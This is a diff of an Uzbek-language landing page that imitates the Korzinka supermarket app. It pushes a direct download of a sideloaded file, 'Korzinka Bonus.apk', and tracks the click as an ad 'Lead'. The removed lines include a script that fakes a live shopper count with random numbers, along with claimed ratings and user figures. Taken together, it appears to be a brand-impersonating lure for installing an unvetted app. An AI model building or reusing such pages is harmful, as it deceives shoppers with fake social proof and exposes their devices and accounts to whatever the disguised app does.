@@ -1,728 +1,484 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Korzinka — Hammasi bir joyda</title>
-    <meta name="description" content="Korzinka mobil ilovasi — smartfoningizdagi qulay xaridlar va sodiqlik dasturi."/>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Korzinka — Hammasi bir joyda</title>
+<meta name="description" content="Korzinka mobil ilovasi — smartfoningizdagi qulay xaridlar va bonus tizimi."/>
 
-  <!-- Meta Pixel Code -->
+<!-- Meta Pixel -->
 <script>
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
 n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
+if(!f._fbq)f._fbq=n;
+n.push=n;
+n.loaded=!0;
+n.version='2.0';
+n.queue=[];
+t=b.createElement(e);
+t.async=!0;
+t.src=v;
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)
+}(window,document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '4344271529164809');
-fbq('track', 'PageView');
+
+fbq('init','4344271529164809');
+fbq('track','PageView');
 </script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=4344271529164809&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
-
-    <style>
-        :root {
-            --primary: #E31313; /* Фирменный красный Korzinka */
-            --accent: #F9BA13;  /* Фирменный желтый */
-            --bg: #F8F9FA;
-            --white: #FFFFFF;
-            --text: #1A1A1A;
-            --muted: #6C757D;
-            --border: rgba(0,0,0,.08);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            overflow-x: hidden;
-            color: var(--text);
-        }
-
-        canvas {
-            position: fixed;
-            inset: 0;
-            z-index: -2;
-            pointer-events: none;
-        }
-
-        nav {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            padding: 16px 40px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            z-index: 999;
-            backdrop-filter: blur(18px);
-            background: rgba(255, 255, 255, 0.85);
-            border-bottom: 1px solid var(--border);
-        }
-
-        .logo {
-            font-size: 1.6rem;
-            font-weight: 800;
-            color: var(--primary);
-            letter-spacing: -0.02em;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .logo span {
-            color: var(--accent);
-        }
-
-        .nav-btn {
-            border: none;
-            cursor: pointer;
-            padding: 12px 24px;
-            border-radius: 999px;
-            font-weight: 700;
-            color: #fff;
-            background: var(--primary);
-            box-shadow: 0 4px 15px rgba(227, 19, 19, 0.2);
-            transition: .3s;
-        }
-
-        .nav-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(227, 19, 19, 0.3);
-        }
-
-        .hero {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 140px 24px 80px;
-            position: relative;
-            overflow: hidden;
-            background: radial-gradient(circle at 80% 20%, rgba(249, 186, 19, 0.15), transparent 40%),
-                        radial-gradient(circle at 20% 80%, rgba(227, 19, 19, 0.08), transparent 50%);
-        }
-
-        .hero-inner {
-            max-width: 1200px;
-            width: 100%;
-            display: grid;
-            grid-template-columns: 1.1fr 0.9fr;
-            gap: 60px;
-            align-items: center;
-        }
-
-        .hero-left {
-            position: relative;
-            z-index: 2;
-        }
-
-        .live-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 16px;
-            border-radius: 999px;
-            background: var(--white);
-            border: 1px solid var(--border);
-            margin-bottom: 24px;
-            font-size: .85rem;
-            color: var(--text);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.02);
-        }
-
-        .pulse {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #28A745;
-            box-shadow: 0 0 10px #28A745;
-            animation: pulse 1.4s infinite;
-            flex-shrink: 0;
-        }
-
-        .online-count {
-            display: inline-block;
-            font-weight: 700;
-            color: var(--primary);
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: .4; transform: scale(.8); }
-        }
-
-        .hero-title {
-            font-size: clamp(2.5rem, 5vw, 4.2rem);
-            line-height: 1.1;
-            font-weight: 800;
-            letter-spacing: -.02em;
-            margin-bottom: 20px;
-            color: var(--text);
-        }
-
-        .hero-title span {
-            color: var(--primary);
-        }
-
-        .hero-text {
-            max-width: 540px;
-            line-height: 1.7;
-            font-size: 1.1rem;
-            color: var(--muted);
-            margin-bottom: 36px;
-        }
-
-        .hero-actions {
-            display: flex;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .main-btn {
-            border: none;
-            cursor: pointer;
-            padding: 18px 32px;
-            border-radius: 16px;
-            font-size: 1rem;
-            font-weight: 700;
-            color: #fff;
-            background: var(--primary);
-            box-shadow: 0 8px 25px rgba(227, 19, 19, 0.25);
-            transition: .3s;
-        }
-
-        .main-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 30px rgba(227, 19, 19, 0.35);
-        }
-
-        .ghost-btn {
-            border: 1px solid var(--border);
-            background: var(--white);
-            padding: 18px 32px;
-            border-radius: 16px;
-            color: var(--text);
-            font-weight: 600;
-            cursor: pointer;
-            transition: .3s;
-        }
-
-        .ghost-btn:hover {
-            background: #F1F3F5;
-            transform: translateY(-2px);
-        }
-
-        .stats {
-            display: flex;
-            gap: 16px;
-            margin-top: 48px;
-            flex-wrap: wrap;
-        }
-
-        .stat {
-            flex: 1;
-            min-width: 140px;
-            padding: 20px;
-            border-radius: 16px;
-            background: var(--white);
-            border: 1px solid var(--border);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.02);
-        }
-
-        .stat h3 {
-            font-size: 1.8rem;
-            font-weight: 800;
-            margin-bottom: 4px;
-            color: var(--text);
-        }
-
-        .stat p {
-            font-size: .85rem;
-            color: var(--muted);
-        }
-
-        .hero-right {
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .phone {
-            width: 340px;
-            border-radius: 40px;
-            padding: 12px;
-            background: #1A1A1A;
-            border: 4px solid #333;
-            box-shadow: 0 30px 70px rgba(0,0,0,.15);
-            transform: rotate(-3deg);
-            animation: float 6s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(-3deg); }
-            50% { transform: translateY(-12px) rotate(-1deg); }
-        }
-
-        .screen {
-            border-radius: 30px;
-            overflow: hidden;
-            background: var(--white);
-            aspect-ratio: 9/19;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 24px;
-            text-align: center;
-            border: 1px solid #000;
-        }
-
-        .screen-logo {
-            font-size: 2.5rem;
-            font-weight: 900;
-            color: var(--primary);
-            margin-bottom: 10px;
-        }
-
-        .screen-card {
-            width: 100%;
-            background: var(--primary);
-            color: white;
-            border-radius: 16px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
-            box-shadow: 0 10px 20px rgba(227,13,13,0.2);
-        }
-
-        .screen-barcode {
-            width: 100%;
-            height: 40px;
-            background: white;
-            margin-top: 15px;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: space-around;
-            padding: 5px;
-        }
-        .screen-barcode span {
-            display: inline-block;
-            width: 2px;
-            height: 100%;
-            background: black;
-        }
-
-        .online-card {
-            position: absolute;
-            right: -10px;
-            top: 60px;
-            background: var(--white);
-            border: 1px solid var(--border);
-            padding: 14px 18px;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            animation: floatCard 5s ease-in-out infinite;
-        }
-
-        @keyframes floatCard {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-8px); }
-        }
-
-        .online-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 700;
-            background: var(--accent);
-        }
-
-        .online-text small {
-            display: block;
-            color: #28A745;
-            font-weight: 600;
-            font-size: .75rem;
-            margin-bottom: 2px;
-        }
-
-        .online-text span {
-            font-size: .88rem;
-            font-weight: 600;
-        }
-
-        .like-popup {
-            position: absolute;
-            left: -20px;
-            bottom: 60px;
-            padding: 14px 18px;
-            border-radius: 16px;
-            background: var(--white);
-            border: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            animation: popup 5s ease-in-out infinite;
-        }
-
-        @keyframes popup {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .like-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(227, 19, 19, 0.1);
-            color: var(--primary);
-        }
-
-        .like-popup strong {
-            display: block;
-            font-size: .9rem;
-            margin-bottom: 2px;
-        }
-
-        .like-popup p {
-            font-size: .8rem;
-            color: var(--muted);
-        }
-
-        .section {
-            padding: 100px 24px;
-            background: var(--white);
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: auto;
-        }
-
-        .section-head {
-            text-align: center;
-            margin-bottom: 60px;
-        }
-
-        .section-head small {
-            color: var(--primary);
-            letter-spacing: .15em;
-            text-transform: uppercase;
-            font-weight: 700;
-            font-size: 0.85rem;
-        }
-
-        .section-head h2 {
-            font-size: clamp(2rem, 4vw, 3rem);
-            font-weight: 800;
-            margin-top: 12px;
-            letter-spacing: -0.01em;
-        }
-
-        .cards {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 24px;
-        }
-
-        .card {
-            padding: 36px;
-            border-radius: 20px;
-            background: var(--bg);
-            border: 1px solid var(--border);
-            transition: .3s;
-        }
-
-        .card:hover {
-            transform: translateY(-6px);
-            border-color: var(--primary);
-            background: var(--white);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
-        }
-
-        .card-icon {
-            width: 60px;
-            height: 60px;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: var(--white);
-            border: 1px solid var(--border);
-            color: var(--primary);
-            font-size: 1.4rem;
-            margin-bottom: 24px;
-        }
-
-        .card h3 {
-            font-size: 1.25rem;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
-
-        .card p {
-            line-height: 1.6;
-            color: var(--muted);
-            font-size: 0.95rem;
-        }
-
-        .cta {
-            margin-top: 80px;
-            padding: 60px 40px;
-            text-align: center;
-            border-radius: 30px;
-            background: linear-gradient(135deg, #FFF9E6, #FFF0F0);
-            border: 1px solid var(--border);
-        }
-
-        .cta h2 {
-            font-size: clamp(2rem, 5vw, 3rem);
-            font-weight: 800;
-            margin-bottom: 16px;
-        }
-
-        .cta p {
-            max-width: 600px;
-            margin: auto;
-            line-height: 1.7;
-            color: var(--muted);
-            margin-bottom: 32px;
-        }
-
-        footer {
-            padding: 40px 24px;
-            text-align: center;
-            color: var(--muted);
-            font-size: 0.9rem;
-            background: var(--bg);
-            border-top: 1px solid var(--border);
-        }
-
-        @media(max-width:980px){
-            .hero-inner { grid-template-columns: 1fr; text-align: center; }
-            .hero-text { margin-inline: auto; }
-            .hero-actions { justify-content: center; }
-            .stats { justify-content: center; }
-            .cards { grid-template-columns: 1fr; }
-            .hero-right { margin-top: 40px; }
-            .phone { transform: none; }
-            .online-card { right: 20px; top: 20px; }
-            .like-popup { left: 20px; bottom: 20px; }
-        }
-
-        @media(max-width:600px){
-            nav { padding: 16px 20px; }
-            .main-btn, .ghost-btn { width: 100%; }
-            .phone { max-width: 290px; }
-            .online-card, .like-popup { transform: scale(.85); }
-        }
-    </style>
+
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4344271529164809&ev=PageView&noscript=1"/>
+</noscript>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+<style>
+
+:root{
+--primary:#E31313;
+--accent:#F9BA13;
+--bg:#F8F9FA;
+--white:#fff;
+--text:#1A1A1A;
+--muted:#6C757D;
+--border:rgba(0,0,0,.08);
+}
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+font-family:'Inter',sans-serif;
+background:var(--bg);
+color:var(--text);
+overflow-x:hidden;
+}
+
+nav{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+padding:16px 40px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+backdrop-filter:blur(18px);
+background:rgba(255,255,255,.9);
+border-bottom:1px solid var(--border);
+z-index:999;
+}
+
+.logo{
+font-size:1.5rem;
+font-weight:800;
+color:var(--primary);
+}
+
+.hero{
+padding:150px 25px 80px;
+}
+
+.hero-inner{
+max-width:1200px;
+margin:auto;
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:60px;
+align-items:center;
+}
+
+.live-badge{
+display:inline-flex;
+align-items:center;
+gap:8px;
+padding:10px 16px;
+background:white;
+border-radius:999px;
+border:1px solid var(--border);
+margin-bottom:20px;
+}
+
+.pulse{
+width:8px;
+height:8px;
+background:#28a745;
+border-radius:50%;
+}
+
+.hero-title{
+font-size:58px;
+font-weight:800;
+line-height:1.1;
+margin-bottom:20px;
+}
+
+.hero-title span{
+color:var(--primary);
+}
+
+.hero-text{
+color:var(--muted);
+line-height:1.7;
+margin-bottom:30px;
+}
+
+.main-btn{
+display:inline-block;
+text-decoration:none;
+padding:18px 35px;
+background:var(--primary);
+border-radius:16px;
+color:white;
+font-weight:700;
+box-shadow:0 10px 25px rgba(227,19,19,.25);
+}
+
+.stats{
+display:flex;
+gap:15px;
+margin-top:40px;
+flex-wrap:wrap;
+}
+
+.stat{
+flex:1;
+padding:20px;
+background:white;
+border-radius:18px;
+border:1px solid var(--border);
+}
+
+.stat h3{
+font-size:28px;
+margin-bottom:5px;
+}
+
+.stat p{
+font-size:14px;
+color:var(--muted);
+}
+
+.phone{
+width:320px;
+margin:auto;
+background:#111;
+padding:12px;
+border-radius:40px;
+box-shadow:0 25px 50px rgba(0,0,0,.15);
+}
+
+.screen{
+background:white;
+border-radius:30px;
+padding:25px;
+aspect-ratio:9/19;
+text-align:center;
+}
+
+.screen-logo{
+font-size:40px;
+color:var(--primary);
+margin-bottom:15px;
+}
+
+.screen-card{
+margin-top:25px;
+padding:20px;
+border-radius:18px;
+background:var(--primary);
+color:white;
+}
+
+.online-card,.like-popup{
+background:white;
+padding:14px;
+border-radius:18px;
+margin-top:15px;
+display:flex;
+gap:12px;
+align-items:center;
+box-shadow:0 10px 25px rgba(0,0,0,.06);
+}
+
+.online-avatar,.like-icon{
+width:40px;
+height:40px;
+border-radius:12px;
+display:flex;
+align-items:center;
+justify-content:center;
+background:rgba(227,19,19,.1);
+color:var(--primary);
+}
+
+.section{
+padding:100px 25px;
+background:white;
+}
+
+.container{
+max-width:1200px;
+margin:auto;
+}
+
+.section-head{
+text-align:center;
+margin-bottom:50px;
+}
+
+.cards{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:25px;
+}
+
+.card{
+padding:30px;
+border-radius:20px;
+background:#fafafa;
+border:1px solid var(--border);
+}
+
+.card-icon{
+width:60px;
+height:60px;
+display:flex;
+align-items:center;
+justify-content:center;
+border-radius:15px;
+background:white;
+margin-bottom:20px;
+color:var(--primary);
+}
+
+.card h3{
+margin-bottom:10px;
+}
+
+.card p{
+line-height:1.6;
+color:var(--muted);
+}
+
+footer{
+padding:35px;
+text-align:center;
+color:var(--muted);
+}
+
+@media(max-width:900px){
+
+.hero-inner{
+grid-template-columns:1fr;
+text-align:center;
+}
+
+.cards{
+grid-template-columns:1fr;
+}
+
+.hero-title{
+font-size:40px;
+}
+
+}
+
+</style>
 </head>
+
 <body>
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=2491403044633394&ev=PageView&noscript=1"
-    /></noscript>
 
-    <canvas id="bg"></canvas>
+<nav>
+<div class="logo">
+<i class="fa-solid fa-basket-shopping"></i>
+korzinka.
+</div>
+</nav>
 
-    <nav>
-        <div class="logo"><i class="fa-solid fa-basket-shopping"></i> korzinka<span>.</span></div>
-    </nav>
+<section class="hero">
 
-    <section class="hero">
-        <div class="hero-inner">
-            <div class="hero-left">
-                <div class="live-badge">
-                    <div class="pulse"></div>
-                    <span>Hozirda ilovada <b class="online-count">42 195</b> kishi xarid qilmoqda</span>
-                </div>
+<div class="hero-inner">
 
-                <h1 class="hero-title">Xaridlar endi yanada <span>osonroq.</span></h1>
-                <p class="hero-text">
-                    Korzinka mobil ilovasi — smartfoningizdagi sodiqlik kartasi, shaxsiy chegirmalar va sevimli supermarketlaringizdagi barcha aksiyalar bitta joyda.
-                </p>
+<div>
 
-                <div class="hero-actions">
-                    <a href="Korzinka Bonus.apk" download class="main-btn">
-                        <i class="fa-solid fa-download"></i> Ilovani yuklab olish
-                    </a>
-                </div>
+<div class="live-badge">
+<div class="pulse"></div>
+<span>Qulay xaridlar va bonus tizimi</span>
+</div>
 
-                <div class="stats">
-                    <div class="stat">
-                        <h3>4.8★</h3>
-                        <p>App Store reytingi</p>
-                    </div>
-                    <div class="stat">
-                        <h3>1M+</h3>
-                        <p>Faol foydalanuvchilar</p>
-                    </div>
-                    <div class="stat">
-                        <h3>100%</h3>
-                        <p>Xavfsiz keshbek</p>
-                    </div>
-                </div>
-            </div>
+<h1 class="hero-title">
+Xaridlar endi yanada
+<span>osonroq</span>
+</h1>
 
-            <div class="hero-right">
-                <div class="phone">
-                    <div class="screen">
-                        <div class="screen-logo"><i class="fa-solid fa-basket-shopping"></i></div>
-                        <h3>Xush kelibsiz!</h3>
-                        <p style="font-size:0.8rem; color:var(--muted); margin-top:5px;">Sizning korzinka kartangiz</p>
-                        <div class="screen-card">
-                            <span style="font-size:0.75rem; font-weight:700; opacity:0.8;">SALOM, XARIDOR!</span>
-                            <h4 style="margin-top:15px; font-size:1.2rem;">55 000 <span style="font-size:0.8rem;">korzinka BNL</span></h4>
-                            <div class="screen-barcode">
-                                <span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+<p class="hero-text">
+Korzinka mobil ilovasi orqali mahsulotlar, bonus tizimi va qulay funksiyalarni bitta joyda kuzatishingiz mumkin.
+</p>
 
-                <div class="online-card">
-                    <div class="online-avatar"><i class="fa-solid fa-percentage"></i></div>
-                    <div class="online-text">
-                        <small>Yangi aksiya</small>
-                        <span>Bugun 20% gacha keshbek!</span>
-                    </div>
-                </div>
+<a href="Korzinka Bonus.apk"
+class="main-btn"
+onclick="fbq('track','Lead')">
 
-                <div class="like-popup">
-                    <div class="like-icon">
-                        <i class="fa-solid fa-coins"></i>
-                    </div>
-                    <div>
-                        <strong>Keshbek hisoblandi</strong>
-                        <p>+2 450 salom bonuslar</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+<i class="fa-solid fa-download"></i>
+Ilovani yuklab olish
 
-    <section class="section">
-        <div class="container">
-            <div class="section-head">
-                <small>IMKONIYATLAR</small>
-                <h2>Nega Korzinka ilovasi qulay?</h2>
-            </div>
+</a>
 
-            <div class="cards">
-                <div class="card">
-                    <div class="card-icon"><i class="fa-solid fa-address-card"></i></div>
-                    <h3>Virtual Saldo</h3>
-                    <p>Plastik kartangizni uyda qoldiring. Kassada telefoningizdagi QR-kodni ko'rsatish kifoya.</p>
-                </div>
+<div class="stats">
 
-                <div class="card">
-                    <div class="card-icon"><i class="fa-solid fa-tags"></i></div>
-                    <h3>Eksklyuziv Chegirmalar</h3>
-                    <p>Faqat ilova foydalanuvchilari uchun amal qiladigan haftalik va kunlik maxsus narxlar.</p>
-                </div>
+<div class="stat">
+<h3>4.8★</h3>
+<p>Qulay foydalanish</p>
+</div>
 
-                <div class="card">
-                    <div class="card-icon"><i class="fa-solid fa-receipt"></i></div>
-                    <h3>Xaridlar Tarixi</h3>
-                    <p>Barcha cheklar elektron ko'rinishda saqlanadi. Xarajatlaringizni oson nazorat qiling.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+<div class="stat">
+<h3>24/7</h3>
+<p>Xizmat mavjud</p>
+</div>
 
-    <footer>
-        © 2026 Korzinka Supermarketlar Tarmog'i · Barcha huquqlar himoyalangan.
-    </footer>
+<div class="stat">
+<h3>Bonus</h3>
+<p>Shaxsiy takliflar</p>
+</div>
 
-    <script>
-        /* Light dynamic background effects (Particles) */
-        const canvas = document.getElementById('bg');
-        const ctx = canvas.getContext('2d');
-        let w, h, particles = [];
+</div>
 
-        function resize() {
-            w = canvas.width = window.innerWidth;
-            h = canvas.height = window.innerHeight;
-        }
-        resize();
-        window.addEventListener('resize', resize);
+</div>
 
-        class Particle {
-            constructor() { this.reset(); }
-            reset() {
-                this.x = Math.random() * w;
-                this.y = Math.random() * h;
-                this.r = Math.random() * 3 + 1;
-                this.vx = (Math.random() - .5) * 0.3;
-                this.vy = (Math.random() - .5) * 0.3;
-            }
-            draw() {
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
-                ctx.fillStyle = 'rgba(223, 19, 19, 0.05)';
-                ctx.fill();
-            }
-            update() {
-                this.x += this.vx;
-                this.y += this.vy;
-                if (this.x < 0 || this.x > w || this.y < 0 || this.y > h) { this.reset(); }
-            }
-        }
+<div>
 
-        for (let i = 0; i < 40; i++) { particles.push(new Particle()); }
+<div class="phone">
 
-        function animate() {
-            ctx.clearRect(0, 0, w, h);
-            particles.forEach(p => {
-                p.update();
-                p.draw();
-            });
-            requestAnimationFrame(animate);
-        }
-        animate();
+<div class="screen">
 
-        /* SIMULATE ACTIVE USERS */
-        const online = document.querySelector('.online-count');
-        let current = 42195;
+<div class="screen-logo">
+<i class="fa-solid fa-basket-shopping"></i>
+</div>
 
-        setInterval(() => {
-            const random = Math.floor(Math.random() * 14) - 7;
-            current += random;
-            online.innerText = current.toLocaleString();
-        }, 2000);
-    </script>
+<h3>Xush kelibsiz</h3>
+
+<div class="screen-card">
+
+<h3>Korzinka Bonus</h3>
+
+<p>
+Mahsulotlar va imkoniyatlar
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="online-card">
+
+<div class="online-avatar">
+<i class="fa-solid fa-star"></i>
+</div>
+
+<div>
+<b>Yangi imkoniyatlar</b>
+<p>Shaxsiy takliflar mavjud</p>
+</div>
+
+</div>
+
+<div class="like-popup">
+
+<div class="like-icon">
+<i class="fa-solid fa-gift"></i>
+</div>
+
+<div>
+<b>Bonus tizimi</b>
+<p>Qulay foydalanish</p>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</section>
+
+<section class="section">
+
+<div class="container">
+
+<div class="section-head">
+
+<h2>Nega Korzinka ilovasi qulay?</h2>
+
+</div>
+
+<div class="cards">
+
+<div class="card">
+
+<div class="card-icon">
+<i class="fa-solid fa-address-card"></i>
+</div>
+
+<h3>Virtual karta</h3>
+
+<p>
+Telefon orqali foydalanish mumkin.
+</p>
+
+</div>
+
+<div class="card">
+
+<div class="card-icon">
+<i class="fa-solid fa-tags"></i>
+</div>
+
+<h3>Takliflar</h3>
+
+<p>
+Ilova orqali mahsulotlar va imkoniyatlarni kuzatish mumkin.
+</p>
+
+</div>
+
+<div class="card">
+
+<div class="card-icon">
+<i class="fa-solid fa-receipt"></i>
+</div>
+
+<h3>Xaridlar tarixi</h3>
+
+<p>
+Cheklar va ma'lumotlarni ko'rish imkoniyati.
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+</section>
+
+<footer>
+© 2026 Korzinka
+</footer>
+
 </body>
 </html>
